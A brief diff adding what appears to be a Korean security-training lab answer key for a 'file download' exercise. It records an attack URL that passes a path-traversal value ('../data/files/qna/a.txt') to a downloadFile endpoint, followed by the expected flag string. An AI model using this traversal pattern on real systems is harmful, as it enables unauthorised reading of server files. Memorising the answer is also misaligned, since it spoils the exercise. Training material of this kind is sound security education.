@@ -1,0 +1,8 @@
+파일 다운로드 2번
+
+1. 공격 URL : https://elms1.skinfosec.co.kr:8082/common20/file/downloadFile?filePath=../data/files/qna/a.txt
+
+2. 정답
+
+file_down_success
+
